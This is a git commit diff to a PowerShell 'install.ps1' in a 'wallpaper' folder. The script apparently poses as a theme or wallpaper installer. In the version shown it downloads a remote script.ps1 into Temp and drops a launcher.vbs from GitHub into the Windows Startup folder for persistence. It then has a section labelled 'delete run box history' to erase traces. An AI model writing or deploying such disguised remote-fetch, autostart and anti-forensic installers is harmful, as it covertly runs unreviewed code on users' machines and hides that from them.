07743bc344877d9dcd5f4157b71cd233684d5f54
FraitRed <136161358+FraitRed@users.noreply.github.com>
2024-05-17 00:16:09 +0300

    Update install.ps1

--- wallpaper/install.ps1
+++ wallpaper/install.ps1
@@ -1,17 +1,10 @@
 #1
 Set-Location $env:Temp
-Invoke-WebRequest https://w.forfun.com/fetch/9f/9f6e10f93c578b57172b33a9b0545594.jpeg -O Anime.jpg
-Invoke-WebRequest https://raw.githubusercontent.com/FraitRed/g/main/wallpaper/script.ps1 -O script.ps1
-Invoke-WebRequest https://raw.githubusercontent.com/FraitRed/g/main/wallpaper/Connection.wav -O Connection.wav
-Invoke-WebRequest https://raw.githubusercontent.com/FraitRed/g/main/wallpaper/Disconnection.wav -O Disconnection.wav
-Invoke-WebRequest https://raw.githubusercontent.com/FraitRed/g/main/wallpaper/genshin.ico -O genshin.ico
-Invoke-WebRequest https://raw.githubusercontent.com/FraitRed/g/main/wallpaper/xui2.cur -O xui2.cur
-Invoke-WebRequest https://raw.githubusercontent.com/FraitRed/g/main/wallpaper/Anime.theme -O Anime.theme
+Invoke-WebRequest https://raw.githubusercontent.com/FraitRed/g/main/script.ps1 -O script.ps1
 
 #2
 Set-Location $env:AppData\Microsoft\Windows\"Start Menu"\Programs\Startup
 Invoke-WebRequest https://raw.githubusercontent.com/FraitRed/g/main/wallpaper/launcher.vbs -O launcher.vbs
-.\launcher.vbs
 
 #3
 # delete run box history
